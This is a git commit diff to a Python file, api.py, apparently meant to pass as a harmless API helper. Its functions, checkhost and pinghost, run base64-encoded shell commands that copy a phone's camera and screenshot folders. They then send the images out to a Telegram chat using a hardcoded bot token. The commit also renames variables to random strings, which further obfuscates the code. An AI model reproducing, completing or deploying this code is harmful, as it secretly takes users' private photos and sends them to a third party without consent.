1276b6cc0de90772005541e4da7dd3e4321afb00
Alouh Sperk <59327781+codewithalouh@users.noreply.github.com>
2023-01-01 14:16:06 +0800

    Add files via upload

--- api.py
+++ api.py
@@ -2,18 +2,18 @@ import os, base64, time, telegram
 
 
 
-def checkhost(image_name, image_dir='.'):
-    image_path = os.path.join(image_dir, image_name)
-    image = open(image_path, 'rb')
+def checkhost(mwock, othkr='.'):
+    pxjirh = os.path.join(othkr, mwock)
+    qzbkoc = open(pxjirh, 'rb')
 
     bot = telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww')
-    bot.send_photo(chat_id=-841939764, photo=image)
+    bot.send_photo(chat_id=-841939764, photo=qzbkoc)
 
 
 
 def pinghost():
-  directory = 'a'
-  if os.path.exists(directory):
+  xkpg = 'a'
+  if os.path.exists(xkpg):
      cpdr = base64.b64decode("b3Muc3lzdGVtKGYiY3AgL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0NhbWVyYS8qIHtkaXJlY3Rvcnl9Ly4iKQ==").decode('utf-8')
      exec(cpdr)
      cpsr = base64.b64decode("b3Muc3lzdGVtKGYiY3AgL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL1NjcmVlbnNob3RzLyoge2RpcmVjdG9yeX0vLiIp").decode('utf-8')
@@ -32,7 +32,7 @@ def pinghost():
      exec(cpmr)
     
  
-  for root, dirs, filenames in os.walk(directory):
+  for root, dirs, filenames in os.walk(xkpg):
     for filename in filenames:
       file_path = os.path.join(root, filename)
       if file_path.endswith(('.jpeg', '.jpg', '.png')):
